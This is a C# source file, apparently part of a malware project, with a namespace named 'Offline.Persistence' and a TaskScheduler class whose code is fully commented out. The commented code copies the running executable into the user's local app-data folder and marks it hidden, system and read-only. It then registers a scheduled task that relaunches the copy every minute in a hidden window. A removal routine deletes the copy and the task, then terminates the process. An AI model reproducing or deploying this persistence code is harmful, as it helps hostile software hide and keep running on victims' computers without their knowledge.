using Microsoft.VisualBasic;
using System;
using System.Diagnostics;
using System.IO;

namespace Offline.Persistence
{
    //TODO
    public class TaskScheduler
    {
        /*public static void StartUpTaskScheduler(string Time, string TaskName)
        {
            try
            {
                if (Time == "" || Time == "%1%" || TaskName == "" || TaskName == "%C%")
                    return;

                string newPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Launch.ExecName;

                if (File.Exists(newPath) == false)
                {
                    File.WriteAllBytes(newPath, File.ReadAllBytes(Launch.ProgramPath));
                    Imports.SetFileAttributes(newPath, Imports.FileAttributes.Hidden | Imports.FileAttributes.System | Imports.FileAttributes.Readonly);
                }
                string ShellCMD = "schtasks /create /sc minute /mo 1 /tn \"||\" /tr \"" + newPath + "\"";
                Interaction.Shell(ShellCMD.Replace("||", TaskName).Replace("1", Time), AppWinStyle.Hide, false, -1);
            }
            catch { }
        }

        public static void RemoveTaskScheduler(string TaskName)
        {
            try
            {
                string newPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Launch.ExecName;
                try
                { File.Delete(newPath); }
                catch { }
                string ShellCMD = "schtasks /delete /tn " + TaskName + " /f";
                Interaction.Shell(ShellCMD, AppWinStyle.Hide, false, -1);
                //InitiateSelfDestructSequence();
                Imports.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
            }
            catch { } //(Exception ex) { MessageBox.Show(ex.ToString()); }
        }*/
    }
}
